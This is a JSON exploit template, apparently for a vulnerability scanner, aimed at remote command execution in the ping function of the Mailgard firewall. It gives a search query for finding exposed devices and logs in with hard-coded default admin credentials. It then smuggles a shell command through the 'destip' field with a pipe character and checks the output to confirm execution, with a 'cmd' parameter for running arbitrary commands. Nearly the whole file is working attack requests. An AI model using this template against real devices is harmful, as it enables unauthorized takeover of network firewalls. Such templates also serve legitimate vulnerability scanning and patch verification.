{
  "Name": "Mailgard Firewall ping function rce",
  "Description": "Mailgard Firewall ping function rce, which may cause the server to be compromised.",
  "Product": "Mailgard-Firewall",
  "Homepage": "http://www.hechen.com/",
  "DisclosureDate": "2020-01-13",
  "Author": "itardc@163.com",
  "FofaQuery": "body=\"防火墙网关管理系统\" && body=\"河辰技术版权所有\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [
    "https://fofa.so/"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "username=admin&password=hicomadmin&language=zh-cn",
        "data_type": "text",
        "follow_redirect": false,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Origin": "{{{fixedhostinfo}}}",
          "Referer": "{{{fixedhostinfo}}}/index.php"
        },
        "method": "POST",
        "uri": "/index.php?c=user&a=ajax_save"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          },
          {
            "bz": "",
            "operation": "contains",
            "type": "item",
            "value": "Set-Cookie: PHPSESSID",
            "variable": "$head"
          },
          {
            "bz": "",
            "operation": "contains",
            "type": "item",
            "value": "\"success\":true",
            "variable": "$body"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    },
    {
      "Request": {
        "data": "interface=&destip=127.0.0.1%7Cecho+Mailgard%7Cmd5sum",
        "data_type": "text",
        "follow_redirect": false,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "{{{fixedhostinfo}}}",
          "Referer": "{{{fixedhostinfo}}}/index.php?c=maintain&a=ping"
        },
        "method": "POST",
        "uri": "/index.php?c=maintain&a=ping"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          },
          {
            "bz": "",
            "operation": "contains",
            "type": "item",
            "value": "2dba20b780cb70f9fea723ecfb6aad96",
            "variable": "$body"
          }
        ],
        "operation": "AND",
        "type": "group"
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": null,
  "Tags": ["rce"],
  "CVEIDs": null,
  "CVSSScore": null,
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": ["Mailgard-Firewall"]
  }
}